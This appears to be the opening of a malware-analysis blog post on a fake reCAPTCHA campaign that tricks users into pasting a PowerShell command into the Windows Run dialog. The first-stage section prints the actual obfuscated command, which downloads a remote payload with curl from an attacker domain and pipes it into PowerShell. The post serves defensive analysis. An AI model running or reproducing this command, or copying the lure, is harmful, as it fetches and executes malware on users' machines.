---
title: "Breaking Down A Multi-Stage PowerShell Infection👾"
last_modified_at: 2025-05-11T12:38:14
---
<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/0.jpg" alt="PowerShell Infection">

# Overview
Fake reCAPTCHA campaigns are nothing new in the cyber threat landscape. Despite their simplicity, these campaigns are surprisingly effective at tricking users.  
The technique is straightforward: the victim is shown a fake reCAPTCHA page that instructs them to verify their identity by pasting a PowerShell command into the Windows Run dialog. This seemingly harmless action initiates the infection chain.

This article will focus on deobfuscating and analyzing the infection chain step by step, all the way to the final payload. It will also break down and explain the various techniques used by the attacker.

Here's a high-level diagram of the infection chain:
<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/1.jpg" alt="PowerShell Infection">

## 1st Stage Analysis

We can see the infamous fake reCAPTCHA page. Upon clicking "I'm not a robot," a prompt pops up, providing us with clear instructions regarding the "verification" process.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/2.jpg" alt="PowerShell Infection">

If we follow the instructions, we notice that something is copied to our clipboard. At first glance, this doesn't appear alarming.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/3.jpg" alt="PowerShell Infection">

However, when we paste the command into a text editor, we quickly realize it reveals something much different from what we initially expected.
```PowerShell
PoWERSHElL -w M"in"i"m"ized c"Url.E"X"e" -k -L --"re"try 9"9"9  ht"tps:/"/"dy"b"e"p.fu"n"/"fb8"8"c"1eb2"1"d"4"f"e2"71"2"723729a"d2"f"e"7"38.tx"t | powe"r"shell -;" ð Access Guard: Validation. RefID: 45ab26cf05b6abc95f
```
